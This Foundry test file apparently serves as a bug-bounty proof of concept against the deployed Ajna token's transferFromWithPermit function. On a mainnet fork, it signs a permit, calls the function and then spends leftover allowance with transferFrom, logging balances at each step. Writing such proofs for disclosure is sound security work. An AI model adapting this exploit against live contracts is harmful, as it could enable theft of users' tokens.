// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface   IERC20 {
  function name() external view returns (string memory);
  function decimals() external view returns (uint8);
  function balanceOf(address owner) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function totalSupply() external view returns (uint256);

  function transfer(address to, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
}

interface IAjanToken is IERC20 {
    function transferFromWithPermit(
        address from_, address to_, address spender_, uint256 value_, uint256 deadline_, uint8 v_, bytes32 r_, bytes32 s_
    ) external;

    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

contract SigUtils {
    bytes32 internal DOMAIN_SEPARATOR;

    constructor(bytes32 _DOMAIN_SEPARATOR) {
        DOMAIN_SEPARATOR = _DOMAIN_SEPARATOR;
    }

    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH =
        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

    struct Permit {
        address owner;
        address spender;
        uint256 value;
        uint256 nonce;
        uint256 deadline;
    }

    // computes the hash of a permit
    function getStructHash(Permit memory _permit)
        internal
        pure
        returns (bytes32)
    {
        return
            keccak256(
                abi.encode(
                    PERMIT_TYPEHASH,
                    _permit.owner,
                    _permit.spender,
                    _permit.value,
                    _permit.nonce,
                    _permit.deadline
                )
            );
    }

    // computes the hash of the fully encoded EIP-712 message for the domain, which can be used to recover the signer
    function getTypedDataHash(Permit memory _permit)
        public
        view
        returns (bytes32)
    {
        return
            keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    DOMAIN_SEPARATOR,
                    getStructHash(_permit)
                )
            );
    }
}

contract ImmunifiTransferFromWithPermit is Test {
    IAjanToken    ajnaToken = IAjanToken(0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079);
    address       spender = 0xf8ea83bEC8CcBC3d5564E23FE71d15f1b1e7f2b0;
    address       to = 0xf8ea83bEC8CcBC3d5564E23FE71d15f1b1e7f2b0;
    SigUtils      sigUtils;

  function setUp() public {
    vm.createSelectFork(vm.envString("ETH_RPC_URL"));
    sigUtils = new SigUtils(ajnaToken.DOMAIN_SEPARATOR());
  }

  function testPermitAttack() public {
    uint256 privateKey = 0xabc123;
    address from = vm.addr(privateKey);
    uint256 amount = 100 ether;

    vm.prank(0x666cf594fB18622e1ddB91468309a7E194ccb799);
    ajnaToken.transfer(from, 1000 ether);
    

    vm.label(address(ajnaToken), "AjnaToken");
    vm.label(address(from), "from");
    vm.label(address(to), "to");
    vm.label(address(spender), "spender");
    vm.label(address(this), "wrong_spender");

    SigUtils.Permit memory permit = SigUtils.Permit({
        owner: from,
        spender: spender,
        value: amount,
        nonce: 0,
        deadline: block.timestamp
    });

    bytes32 digest = sigUtils.getTypedDataHash(permit);

    console.log("Step 1 - Generating signature");
    vm.startPrank(from);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
    // ajnaToken.approve(address(this), type(uint256).max);
    ajnaToken.approve(address(this), 1000 ether);

    vm.stopPrank();


    console.log("Step 2 - transferFromWithPermit");
    console.log("starting allowance, ", ajnaToken.allowance(from, spender));
    console.log("starting allowance, ", ajnaToken.allowance(from, address(this)));
    emit log_named_decimal_uint("Spender's balance 0", ajnaToken.balanceOf(spender), 18);
    ajnaToken.transferFromWithPermit(from, to, spender, amount, block.timestamp, v, r, s);
    emit log_named_decimal_uint("Spender's balance 1", ajnaToken.balanceOf(spender), 18);
    console.log("Spender's allowance 1, ", ajnaToken.allowance(from, spender));
    console.log("Spender's allowance 1", ajnaToken.allowance(from, address(this)));

    console.log(to, spender, address(this));

    console.log("Step 3 - Another transferFrom");
    uint256 allowance = ajnaToken.allowance(from, spender);
    emit log_named_decimal_uint("Remaining allowance", allowance, 18);
    vm.startPrank(spender);
    ajnaToken.transferFrom(from, spender, allowance);
    emit log_named_decimal_uint("From's balance", ajnaToken.balanceOf(from), 18);
    emit log_named_decimal_uint("Spender's balance 2", ajnaToken.balanceOf(spender), 18);
    uint256 startAllowance = ajnaToken.allowance(from, spender);
    emit log_named_decimal_uint("Starting allowance", startAllowance, 18);
    vm.stopPrank();
 }
}
